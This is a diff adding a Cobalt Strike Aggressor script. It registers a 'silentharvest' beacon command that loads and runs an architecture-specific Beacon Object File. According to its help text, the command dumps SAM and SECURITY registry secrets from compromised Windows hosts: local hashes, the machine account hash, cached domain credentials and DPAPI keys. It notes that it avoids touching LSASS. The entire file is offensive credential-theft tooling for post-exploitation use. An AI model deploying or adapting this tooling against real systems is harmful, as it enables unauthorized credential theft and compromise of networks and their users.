@@ -1,0 +1,35 @@
+alias silentharvest
+{
+    local('$bid $barch $args $process');
+
+    $bid = $1;
+    $barch  = barch($1);
+
+    # read in the right BOF file
+    $handle = openf(script_resource("silentharvest. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Announce what we are doing
+    blog($bid, "Executing SilentHarvest BOF");
+
+    # Execute BOF
+    beacon_inline_execute($bid, $data, "go", $null);
+}
+
+beacon_command_register(
+    "silentharvest",
+    "Gather SAM and SECURITY secrets using the SilentHarvest method of dumping registry values",
+	"
+Command: silentharvest
+Summary: Gather SAM and SECURITY secrets using the SilentHarvest method
+         of dumping registry values. Does not touch the LSASS process or
+         manipulate in-memory credentials. This is effectively hashdump
+         + machine account hash + cached domain users + DPAPI keys
+         
+Usage:   silentharvest
+
+Example:
+         silentharvest
+"
+); 
